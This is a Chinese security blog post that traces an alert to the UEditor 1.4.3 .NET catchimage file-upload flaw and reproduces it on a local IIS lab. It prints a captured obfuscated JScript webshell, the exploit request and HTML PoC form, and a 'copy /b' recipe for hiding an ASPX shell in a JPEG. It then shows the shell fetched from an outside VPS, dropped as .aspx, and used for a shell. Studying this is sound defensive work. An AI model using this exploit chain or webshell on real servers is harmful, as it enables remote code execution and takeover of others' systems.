ailx10说：这篇是我2024年2月写的。UEditor 的 catchimage 告警里，远程地址看上去是图片，后面却跟着一个让人起疑的后缀。我沿着 source 参数去看，才把“图片”与小马的线索接起来，又在本地 IIS 和旧版组件里搭环境复现。JPEG 后面附的内容、远程抓图的位置和最后落下的文件，得放到一起才看得明白。这篇记录的不是随手打开一张图，而是从一条上传请求，走到环境配置、文件处理和客户端验证的完整追踪，许多看似不起眼的后缀都在其中起作用。

---

UEditor1.4.3 .NET远程抓图扩展绕过实验，IIS应用部署、JPEG附ASPX、抓取并用客户端验证控制。

## 结论与待核验条件

乱码或SUCCESS单独不足执行证明，客户端验证更强；只针对旧.NET特定配置，不外推所有编辑器版本。

## 历史实验记录

昨天告警巡检，又遇到一个有趣的载荷

```
POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1

...(省略)...

source[]=http://www.o64.cc/dedecms/ppxshell.gif?.aspx
```

跟踪这个source，发现是webshell小马，乱码部分应该是 getshell成功

![](/notes-assets/928c542d9bebdabb1d47.webp)

```
<% function ENW350v2(){var GEPH="unsa",YACK="fe",CA8A=GEPH+YACK;return CA8A;}var PAY:String=Request["xise"];~eval/*ZrUKBYe95A*/(PAY,ENW350v2());%><%@Page Language=JS%>

getshell
```

URL路径明显是百度的UEditor编辑器，其中 1.4.3 .net 版本存在文件上传漏洞，现在已经无法下载了[\[1\]](#ref_1)，不过可以从 archive 下载到历史文件，保存到了我的github仓库[\[2\]](#ref_2) ，在我的windows11上搭建了IIS，复现了漏洞

![](/notes-assets/b29345e302b271335d7f.webp)

注意先配置 net 为应用程序

![](/notes-assets/6f136ec52717094e74de.webp)

然后访问

```
http://192.168.0.104/ueditor/net/controller.ashx?action=catchimage
```

就能看到

```
{"state":"参数错误：没有指定抓取源"}
```

![](/notes-assets/f59207af6e0024956354.webp)

制作 POC：2.html

```
<form action="http://192.168.0.104/ueditor/net/controller.ashx?action=catchimage" enctype="multipart/form-data" method="POST">

  

 <p>shell addr: <input type="text" name="source[]" /></p>

   

 <input type="submit" value="Submit" />

   

</form>
```

访问 2.html（已经省略 POC 的程序）

![](/notes-assets/4c119eff8e2162813ddb.webp)

制作图片码（已经省略 图片马 的程序）

```
copy 4.jpg/b + 3.aspx 5.jpg
```

![](/notes-assets/cfb99a2ef955abf9862e.webp)

将图片马放到我的 vps

![](/notes-assets/463aa56b7eaab0da963e.webp)

访问 2.html，提交载荷： `http://144.34.162.13:7777/5.jpg?.aspx` ，成功返回如下所示：

```
{"state":"SUCCESS","list":[{"state":"SUCCESS","source":"http://144.34.162.13:7777/5.jpg?.aspx","url":"upload/image/20240224/6384437103342810845916795.aspx"}]}
```

![](/notes-assets/bbf49de2a268191be198.webp)

访问一下提交的图片马路径，看到乱码，说明成功了

![](/notes-assets/d0a14b66b45e1519de5e.webp)

上菜刀，直接 getshell ，成功，没有人比我更懂 UEditor

![](/notes-assets/61363083488fa16d22a6.webp)
